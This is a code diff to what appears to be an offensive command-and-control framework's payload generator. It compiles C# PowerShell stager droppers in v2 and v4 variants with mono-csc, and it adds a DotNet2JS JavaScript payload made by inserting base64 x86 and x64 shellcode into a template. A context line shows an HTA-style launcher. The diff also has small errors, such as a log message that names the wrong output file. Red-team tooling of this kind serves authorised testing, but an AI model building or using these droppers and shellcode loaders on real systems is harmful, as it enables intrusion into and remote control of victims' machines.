@@ -360,12 +360,28 @@ ao.run('%s', 0);window.close();
             compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs_ps.dll %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
             compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs_ps.exe %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
         else:
-            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps.dll -target:library -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
-            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps.exe -target:exe -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
+            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
+            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
         subprocess.check_output(compile, shell=True)
-        self.QuickstartLog("C# Powershell DLL written to: %s%sdropper_cs_ps.dll" % (self.BaseDirectory, name))
+        self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
         subprocess.check_output(compileexe, shell=True)
-        self.QuickstartLog("C# Powershell EXE written to: %s%sdropper_cs_ps.exe" % (self.BaseDirectory, name))
+        self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
+        #add here
+        with open("%sDotNet2JS.js" % FilesDirectory, 'r') as f:
+            dotnet = f.read()        
+        with open('%s%sPosh_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_64 = f.read()
+        with open('%s%sPosh_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_86 = f.read()
+
+        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
+        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8'))
+
+        self.QuickstartLog("DotNet2JS Payload written to: %s%sDotNet2JS.js" % (self.BaseDirectory, name))
+        filename = "%s%sDotNet2JS.js" % (self.BaseDirectory, name)
+        output_file = open(filename, 'w')
+        output_file.write(dotnet)
+        output_file.close()  
 
 
     def CreatePython(self, name=""):
